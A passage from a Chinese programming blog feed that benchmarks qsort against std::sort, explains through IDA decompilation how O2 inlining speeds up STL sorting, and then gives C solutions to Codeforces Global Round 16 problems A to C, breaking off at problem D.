        <content type="html"><![CDATA[<div class="note warning simple"><p><strong>注意</strong><br>本文仅代表个人浅显观点. 尽量考虑很多可能的情况了, 但也可能还是有以偏概全的情况, 如果有错误, 欢迎指正.</p></div><p>之前主要学的C, 因为那个时候听说C比C++快. 现在我写代码几乎都是C风格的. <span class="p gray">(但不完全是, 虽然说没有用C++的太多特性, 但我的代码经过纯C编译时还是会出错, 因为有时变量没有在开头申明, 结构体在使用时也没有在前面加<code>struct</code>)</span> 最近打acm了解了点C++和STL, 在看其他人代码的时候发现大多数人用的C++风格代码. 他们排序时用的是<code>sort</code>函数. 然后我就想测试一下<code>qsort</code>和<code>std::sort</code>哪个快. 翻文章和做逆向时学到了很多东西, 在此记录一下.</p><h1 id="效率测试"><a href="#效率测试" class="headerlink" title="效率测试"></a>效率测试</h1><p>直接放测试代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    DWORD pid;</span><br><span class="line">    HWND hWnd = <span class="built_in">GetConsoleWindow</span>();</span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="built_in">GetCurrentProcessId</span>())&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getchar</span>() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONGLONG frequency = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONGLONG <span class="title">counter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">QueryPerformanceCounter</span>(&amp;l)) <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> l.QuadPart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p1, <span class="keyword">const</span> <span class="keyword">void</span> *p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">int</span>*)p1 - *(<span class="keyword">int</span>*)p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">QueryPerformanceFrequency</span>(&amp;l))&#123;</span><br><span class="line">        frequency = l.QuadPart;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Counter frequency: %lld\n&quot;</span>, frequency);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x1234</span>);</span><br><span class="line">    <span class="keyword">int</span> N = <span class="number">0x400000</span>;</span><br><span class="line">    <span class="keyword">int</span> *s = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) s[i] = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; N; i++) s[i] = i;</span></span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; N; i++) s[i] = N - i;</span></span><br><span class="line">    LONGLONG c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *t = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    <span class="built_in">memcpy</span>(t, s, N * <span class="built_in"><span class="keyword">sizeof</span></span> (<span class="keyword">int</span>));</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="built_in">qsort</span>(t, N, <span class="built_in"><span class="keyword">sizeof</span></span> (<span class="keyword">int</span>), &amp;cmp);</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;qsort     %lld\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">delete</span> t;</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">    v.<span class="built_in">resize</span>(N);</span><br><span class="line">    <span class="built_in">memcpy</span>(v.<span class="built_in">data</span>(), s, N * <span class="built_in"><span class="keyword">sizeof</span></span> (<span class="keyword">int</span>));</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt;::iterator _l = v.<span class="built_in">begin</span>(), _r = v.<span class="built_in">end</span>();</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="built_in">sort</span>(_l, _r);</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;std::sort %lld\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> s;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pause</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单解释一下吧. 代码用了Windows平台的一些特性. <code>pause</code>函数不用也行, 主要是在调试时你总不希望程序双击运行的时候窗口一闪而过吧. 这个函数会判断当前窗口是否是自身进程(在命令行下运行窗口就不是自身进程, 是宿主cmd的), 如果是就暂停. <code>counter</code>是一个高精度的计时器(硬件层计数器), 比<code>GetTickCount</code>精确. 两次计数的差值就是计数时代码的运行时间, 单位是tick每秒. tick保存在<code>frequency</code>变量里, 在我的电脑上它的值为10000000(所以说比较精确). 然后后面的就是测试程序了, 相信这个应该好看懂.</p><p>在我电脑上测试结果如下(<code>N=0x400000</code>):</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据</th><th style="text-align:right"><code>qsort</code>用时</th><th style="text-align:right"><code>std::sort</code>用时</th><th style="text-align:right">不优化的<code>std::sort</code>用时</th></tr></thead><tbody><tr><td style="text-align:center">乱序</td><td style="text-align:right">3,312,103</td><td style="text-align:right">2,162,993</td><td style="text-align:right">10,723,971</td></tr><tr><td style="text-align:center">正序</td><td style="text-align:right">1,698,487</td><td style="text-align:right">636,871</td><td style="text-align:right">6,639,209</td></tr><tr><td style="text-align:center">逆序</td><td style="text-align:right">1,755,068</td><td style="text-align:right">499,027</td><td style="text-align:right">5,116,859</td></tr></tbody></table></div><p>编译参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc &quot;%~1&quot; -o &quot;%~n1.exe&quot; -O2 -g -lstdc++ %O2优化%</span><br><span class="line">gcc &quot;%~1&quot; -o &quot;%~n1d.exe&quot; -O0 -g -lstdc++ %无优化%</span><br></pre></td></tr></table></figure><blockquote><p>在acm比赛时, 一般开O2优化</p></blockquote><p>由于<code>qsort</code>只是库中的一个函数, 所以开不开优化对时间影响不大; 而<code>std::sort</code>是模板库, 会参与编译过程, 于是把两种情况都列了出来. 上面的结果吓我一跳, 之前听说C++输入输出流如果处理好会比C的输入输出快, 没想到C++的<code>std::sort</code>处理好效率也会很高. 于是我打开IDA, <psw>胡乱地</psw>分析一波.</p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><h2 id="O2优化改变了什么"><a href="#O2优化改变了什么" class="headerlink" title="O2优化改变了什么"></a>O2优化改变了什么</h2><p>IDA打开后, 直接F5大法好, 得到下图:<br><div class="justified-gallery"><p><img src="/pictures/test_sort_optimize_0.jpg" alt="不优化"><br><img src="/pictures/test_sort_optimize_2.jpg" alt="优化"></p>          </div></p><p>其中代码少的那个是不优化的.<br><mark class="hl-label pink">什么嘛, 明明不优化更简单一些, 怎么就慢了这么多?</mark> <br>这就是产生效率问题的华点, 解释下代码先.</p><ul><li>左图中的<code>counter</code>函数被内联了, 简单来说就是把函数内部的代码直接”拿来”, 嵌到调用函数的地方, 这样可以减少堆栈的使用, 进而提升效率. 所以左图中第34行, 对应右图的45-46行. 下面出现的<code>counter</code>同理.</li><li>左图39-43行, 是初始化<code>vector</code>和从<code>s</code>搬移数组的代码, 对应右边54-57行. 也是发生了一定的内联.</li><li>47行调用了<code>std::sort</code>进行排序, 对应右边61-94行</li></ul><p>右图看起来代码很多就是因为排序函数的内联展开, 但是, 这真的说明右边的代码多吗?<br>我们从左图的排序函数点进去, 图太多懒得截了, 总之里面调用了很多其他函数, 而且其他函数又调用了很多函数, 但这些有很多是重载运算符的函数, 它们实际上只是简单地返回一个值. 也就是说如果可以把它们内联, 代码量是可以大量减少的. 实际上, 开O2优化让代码的体积减少了50K. 虽然说调试符号占了大多数体积, 不输出调试符号只能减少大概10K. 但是如果你的代码用了更多STL的内容, 优化的效果就很显著了.<br>扯远了~~ 反正逆向后我找到的区别就这么些. 我修改了代码, 统计排序比较的次数, 结果在乱序的情况下, 二者的比较次数都是96906511次, 就是说优化并没有改变算法过程, 它只是内联了部分函数而已. 下面我们来看看不开优化的函数调用关系:</p><p><img src="/pictures/sort_stack.svg" alt="函数调用图"></p><p>别看不优化也只调用这么几个函数, 其实是我把一些不重要的忽略了. 而且像这些末端函数内部也是有大量优化操作的, 这个图只是展示了<code>main</code>函数中我们看到的<code>std::sort</code>优化与否的区别. 不优化的时候, 我们从<code>main</code>函数上只看到了第一层, 即<code>std::sort</code>. 开O2优化时, 我们看到了第四层, 直接看到了图中的三个叶子结点, 它们对应61行, 66行和70-94行. 如果我们从优化后的<code>std::__introsort_loop</code>点进去, 会发现又是巨量的优化. 所以, 这个优化极大地减少了函数调用次数.</p><h2 id="关于函数调用"><a href="#关于函数调用" class="headerlink" title="关于函数调用"></a>关于函数调用</h2><p>为什么函数调用对效率的影响这么大呢?<br>函数调用的过程:</p><ul><li>准备好所有参数, 将它们置入栈或者寄存器, 其中前者要比后者慢.</li><li>执行<code>call</code>指令(期间会将调用函数后的下一行代码的地址(<code>EIP</code>/<code>RIP</code>)入栈).</li><li>从寄存器中取得返回值.</li></ul><p>测试使用的是x64的编译器, 前四个参数都是通过寄存器传递(32位的<code>__thiscall</code>有3个是栈传递), 然后返回地址通过栈传递. 如果我把函数内联了, 这些操作都不会有, 速度上就可以快一点. 如果一个函数被调用很多次, 对效率的影响就有些明显了.</p><p>可能有点绕, 下面是一个直观的例子(不开优化, 手动模拟内联操作):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    DWORD pid;</span><br><span class="line">    HWND hWnd = <span class="built_in">GetConsoleWindow</span>();</span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="built_in">GetCurrentProcessId</span>())&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getchar</span>() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONGLONG frequency = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONGLONG <span class="title">counter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">QueryPerformanceCounter</span>(&amp;l)) <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> l.QuadPart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one__</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one_</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="built_in">one__</span>();&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="built_in">one_</span>();&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">QueryPerformanceFrequency</span>(&amp;l))&#123;</span><br><span class="line">        frequency = l.QuadPart;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Counter frequency: %lld\n&quot;</span>, frequency);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LONGLONG c, cc = <span class="number">0</span>;</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x7FFFFFFF</span>; i++)&#123;</span><br><span class="line">        cc += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inline   %lld\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    cc = <span class="number">0</span>;</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x7FFFFFFF</span>; i++)&#123;</span><br><span class="line">        cc += <span class="built_in">one</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function %lld\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pause</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Counter frequency: 10000000</span><br><span class="line">inline   39988174</span><br><span class="line">function 81251130</span><br></pre></td></tr></table></figure></p><p>可以看到, 如果原来调用嵌入函数需要8秒, 那内联以后就只需要4秒. 这是3层嵌套, 实际上刚才的<code>std::sort</code>内部的某些过程可能比这还多. 所以, 使用STL的话, 开优化还是很必要的.</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><code>qsort</code>内部使用快速排序, <code>std::sort</code>根据实际情况混合使用内省排序, 快速排序, 堆排序. 从原理上说后者是比前者快的, 但由于模板的存在, 后者的函数调用次数过多, 所以看起来后者更慢. 在编译器打开O2优化的情况下, 一些函数调用被内联了, 后者的优势显现出来. 所以, 如果打开优化, 只是让编译过程慢一点点, 等编译完成后速度会飞起. 在实际写代码时, 也不用纠结于一个函数要不要指定<code>__inline</code>(如果你的项目只有一个文件), 编译器会帮我们优化这个过程.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://baike.baidu.com/item/%E5%86%85%E7%9C%81%E6%8E%92%E5%BA%8F/6471937?fr=aladdin">内省排序_百度百科</a><br><a href="https://www.zhihu.com/question/457660026/answer/1868951797">为什么g++能够优化到动态库里的STL-知乎</a><br><a href="https://www.cnblogs.com/jo3yzhu/p/12539699.html">为什么不要自己乱造轮子: std::sort方法的实现</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
            <tag> 测试 </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Global Round 16 部分题解记录</title>
      <link href="/2021/09/19/CodeforcesG16/"/>
      <url>/2021/09/19/CodeforcesG16/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="A-Median-Maximization"><a href="#A-Median-Maximization" class="headerlink" title="A. Median Maximization"></a>A. Median Maximization</h2><p><a href="https://codeforces.com/contest/1566/problem/A">原题链接</a></p><blockquote><p>给定一个非负整数组的元素个数$n$与和$s$, 求数组的最大中位数.</p></blockquote><p>贪心地把前面一半设为$0$, 其他取平均, 但由于是整数, 只能向下取整.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s / (n / <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-MIN-MEX-Cut"><a href="#B-MIN-MEX-Cut" class="headerlink" title="B. MIN-MEX Cut"></a>B. MIN-MEX Cut</h2><p><a href="https://codeforces.com/contest/1566/problem/B">原题链接</a></p><blockquote><p>给定一个只含0和1的字符串, 求分割字符串后每段MEX和的最小值. MEX指不在数列中最小非负整数.</p></blockquote><ul><li>答案的最大可能值就是2, 因为对于任意一个串, 不切割的MEX值总是不大于2的.</li><li>先考虑答案是0的情况, 只能是所有字符都是1的时候才可能取到0.</li><li>再考虑答案大于0的情况, 如果枚举串中0的段数, 有多少段0答案就是多少. 但是如果答案大于2就不如不切割划算, 所以大于2的话答案就修正为2.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> zero = <span class="number">0</span>, one = <span class="number">0</span>, seg = <span class="number">0</span>, con = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (s[i] != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (s[i])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: <span class="keyword">if</span> (!con)&#123;seg++; con = <span class="number">1</span>;&#125; zero++; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: con = <span class="number">0</span>; one++; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (zero == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (one == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> seg &lt; <span class="number">2</span> ? seg : <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, calc());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-MAX-MEX-Cut"><a href="#C-MAX-MEX-Cut" class="headerlink" title="C. MAX-MEX Cut"></a>C. MAX-MEX Cut</h2><p><a href="https://codeforces.com/contest/1566/problem/C">原题链接</a></p><blockquote><p>给一个$2 \times n$的矩阵, 把矩阵纵切成几段矩阵, 求每段MEX和的最大值. MEX指不在矩阵中出现的最小非负整数.</p></blockquote><p>和B题思路一样 <del>但是, 没有完全一样</del></p><ul><li>假设有一段出现了0和1, 那把它们单独切割出来不会减少对结果的贡献. 所以碰到$\begin{bmatrix} 0 \\ 1 \end{bmatrix}$这样的列, 单独拿出来就可以了.</li><li>如果出现$\begin{bmatrix} 0 \\ 0 \end{bmatrix}$这种, 答案可以加1, 但是如果旁边有独立的$\begin{bmatrix} 1 \\ 1 \end{bmatrix}$, 可以把它们合并, 这样本来后者没有贡献, 一合并就可以让答案再加1.</li><li>其他的$\begin{bmatrix} 1 \\ 1 \end{bmatrix}$对答案没有贡献.</li></ul><p>可以在读入数据时直接把第二行加到第一行上, 减少点空间开销, 也可以减少考虑的情况.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, con = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (b[i])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: sum++; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: sum += <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; b[i - <span class="number">1</span>] == <span class="number">0</span>) sum++;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; n - <span class="number">1</span> &amp;&amp; b[i + <span class="number">1</span>] == <span class="number">0</span>)&#123;sum += <span class="number">2</span>; b[i + <span class="number">1</span>] = <span class="number">3</span>;&#125;</span><br><span class="line">            &#125;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T; <span class="keyword">char</span> c; <span class="keyword">int</span> n, i, j;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;c);</span><br><span class="line">                b[j] = i == <span class="number">0</span> ? (c - <span class="string">&#x27;0&#x27;</span>) : (b[j] + c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, calc(n));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Seating-Arrangements"><a href="#D-Seating-Arrangements" class="headerlink" title="D. Seating Arrangements"></a>D. Seating Arrangements</h2><p><a 